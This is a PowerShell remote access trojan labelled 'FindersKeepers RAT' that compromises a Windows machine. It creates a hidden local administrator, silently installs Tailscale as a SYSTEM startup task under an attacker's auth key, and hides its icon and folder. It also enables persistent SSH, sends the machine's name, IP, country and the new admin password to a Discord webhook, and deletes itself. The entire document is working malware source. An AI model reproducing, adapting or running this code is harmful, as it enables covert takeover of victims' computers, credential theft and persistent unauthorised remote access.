## Create random text (8 letters)
function randomText {
  return -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
}

## Create Local Admin FUNCTION
function createAdmin {
  param (
    [string] $uName,
    [securestring] $pWord
  )
  begin{
  }
  process {
    New-LocalUser "$uName" -Password $pWord -FullName "$uName" -Description "Temporary local admin"
    Write-Verbose "$uName local user crated"
    Add-LocalGroupMember -Group "$group" -Member "$uName"
    Write-Verbose "$uName added to the local administrator group"
  }
  end{
  }
}

## Installs Trailscale
function installTailscale {
  param ( [string] $path)

  ## CD to Temp
  Set-Location $path

  ## Download and install tailnet
  Invoke-Webrequest -Uri https://pkgs.tailscale.com/stable/tailscale-setup-1.50.1-amd64.msi -OutFile file.msi
  msiexec.exe /a file.msi /quiet
  
  ## Adds Tailscale to task scheduler
  $name = "Tailscale"
  $action = New-ScheduledTaskAction -Execute "C:\Tailscale\tailscaled.exe" 
  $trigger = New-ScheduledTaskTrigger -AtStartup 
  $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highes
  $settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -WakeToRun -AllowStartIfOnBatteries -StartWhenAvailable

  if (Get-ScheduledTask $name -ErrorAction SilentlyContinue) {Unregister-ScheduledTask $name} 
  Register-ScheduledTask -TaskName $name -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description "Tailscale Service, Preinstalled for Windoes"
}

## Remove Icon 
function removeIcon {
[CmdletBinding(SupportsShouldProcess = $true)]

param(
    [Parameter(Mandatory=$true, HelpMessage='Path of program')] [string] $ProgramPath,
    [Parameter(HelpMessage='Hide notify icon, default is to show')] [switch] $Hide
)

Begin
{
    $script:TrayNotifyKey = 'HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify'
    $script:HeaderSize = 20
    $script:BlockSize = 1640
    $script:SettingOffset = 528

    function GetStreamData
    {
        param([byte[]] $stream)
        $builder = New-Object System.Text.StringBuilder
        
        # this line will ROT13 the data so you view/debug the ASCII contents of the stream
        #$stream | % { if ($_ -ge 32 -and $_ -le 125) { [void]$builder.Append( [char](Rot13 $_) ) } };

        $stream | ForEach-Object { [void]$builder.Append( ('{0:x2}' -f $_) ) }
        return $builder.ToString()
    }

    function EncodeProgramPath
    {
        param([string] $path)

        $encoding = New-Object System.Text.UTF8Encoding
        $bytes = $encoding.GetBytes($path)

        $builder = New-Object System.Text.StringBuilder
        $bytes | ForEach-Object { [void]$builder.Append( ('{0:x2}00' -f (Rot13 $_)) ) }
        return $builder.ToString()
    }

    function BuildItemTable
    {
        param([byte[]] $stream)

        $table = @{}
        for ($x = 0; $x -lt $(($stream.Count - $HeaderSize) / $BlockSize); $x++)
        {
            $offset = $HeaderSize + ($x * $BlockSize)
            $table.Add($offset, $stream[$offset..($offset + ($BlockSize - 1))] )
        }
    
        return $table
    }

    function Rot13
    {
        param([byte] $byte)

            if ($byte -ge  65 -and $byte -le  77) { return $byte + 13 } # A..M
        elseif ($byte -ge  78 -and $byte -le  90) { return $byte - 13 } # N..Z
        elseif ($byte -ge  97 -and $byte -le 109) { return $byte + 13 } # a..m
        elseif ($byte -ge 110 -and $byte -le 122) { return $byte - 13 } # n..z
        
        return $byte
    }
}
Process
{
    # 0=only show notifications, 1=hide, 2=show icon and notifications
    $Setting = 2
    if ($Hide) { $Setting = 1 }

    $trayNotifyPath = (Get-Item $TrayNotifyKey).PSPath
    $stream = (Get-ItemProperty $trayNotifyPath).IconStreams

    $data = GetStreamData $stream
    #Write-Host $data

    $path = EncodeProgramPath $ProgramPath
    #Write-Host $path
    #Write-Host ( $path.Split('00') | ? { $_.Length -gt 0 } | % { [char](Rot13 ([Convert]::ToByte($_, 16))) } )

    if (-not $data.Contains($path))
    {
        Write-Warning "$ProgramPath not found. Programs are case sensitive."
        return
    }

    $table = BuildItemTable $stream
    #$table.Keys | % { Write-Host "$_`: " -ForegroundColor Yellow -NoNewline; Write-Host $table[$_] }

    # there may be multiple entries in the stream for each program, e.g. DateInTray will
    # have one entry for every icon, 1..31!!
    foreach ($key in $table.Keys)
    {
        $item = $table[$key]

        $builder = New-Object System.Text.StringBuilder
        $item | ForEach-Object { [void]$builder.Append( ('{0:x2}' -f $_) ) }
        $hex = $builder.ToString()

        if ($hex.Contains($path))
        {
            Write-Host "$ProgramPath found in item at byte offset $key"

            # change the setting!
            $stream[$key + $SettingOffset] = $Setting

            if (!$WhatIfPreference)
            {
                Set-ItemProperty $trayNotifyPath -name IconStreams -value $stream
            }
        }
    }
}
  
}

## Temp Directory
## variables
$temp = "$env:temp"
$dirName = randomText
$pWordClear = randomText
$pWord = (ConvertTo-SecureString  $pWordClear -AsPlainText -Force)
$uName = "fkrat"
$rPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
$group = (((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value) -Split "\\")[1]
$Webhook = Get-Content ./webhook
$authKey = Get-Content ./authKey
$country = ((((Get-WinHomeLocation)[0] | Select-Object HomeLocation) | ConvertTo-Json -Compress -Depth 100)[17..300] -join '') 
$country = $country.Substring(0, $country.length - 2)


## Create Admin
createAdmin -uName $uName -pWord $pWord

## Hide FK-RAT User (Admin)
New-Item -Path $rPath -Force
New-ItemProperty -Path $rPath -Name $uName -Value 00000000
timeout 2

## goto Temp and make dir
Set-Location $temp	
New-Item -Path $temp -Name $dirName -Type Directory
Set-Location $dirName

## Install Tailscale and take ip
installTailscale -authKey $authKey -path $temp/$dirName 
$ip = (Get-NetIPAddress -AddressFamily IPv4 -AddressState Preferred -InterfaceAlias "Tailscale").IPAddress 
Set-Location $PSScriptRoot

Start-Sleep 5
removeIcon -ProgramPath "C:\Tailscale\tailscale-ipn.exe" -Hide 
Set-Location C:\Tailscale\
Start-Process -FilePath ".\tailscaled.exe" -windowstyle hidden -Verb RunAs
Start-Process -FilePath ".\tailscale.exe" -windowstyle hidden -Verb RunAs -ArgumentList 'up --authkey $authKey --unattended'
Set-Location $temp\$dirName

## Sends Discord Webhook
# FIXME: Message isn't beeing send
$description = @"
New Computer infected 
---------------------------------
Computer Name = $env:computername 
User Name = $env:username
Computer Language = $env:LANG
Location (country) = $country
IP = $ip
Account Password = $pwordClear
"@
New-Item ./$env:computername.fk -Value ( " " + $ip," " + $pwordClear,"C:/Users/$uName","Ignore this file if you aren't familiar with Network Statistics" -join [Environment]::NewLine + [Environment]::NewLine )
$payload = @{
  'username' = 'FindersKeepers RAT'
  'content'  = $description
}
Invoke-RestMethod -Uri $Webhook -Method Post -Body $payload;
curl.exe -F "file1=@./$env:computername.fk" $Webhook
Pause

## Enable persistent SSH
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

## Self Delete
Remove-Item "$PSScriptRoot/$env:computername.fk" 
Remove-Item "$PSScriptRoot/webhook"
Remove-Item "$PSScriptRoot/authkey"
Remove-Item $PSCommandPath -Force 

## Finish Tailscale installation
Get-Item "C:\tailscale" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
Start-Process -FilePath 'C:\Tailscale\tailscale.exe' -windowstyle hidden -Verb RunAs -ArgumentList "up --authkey $authKey --unattended"
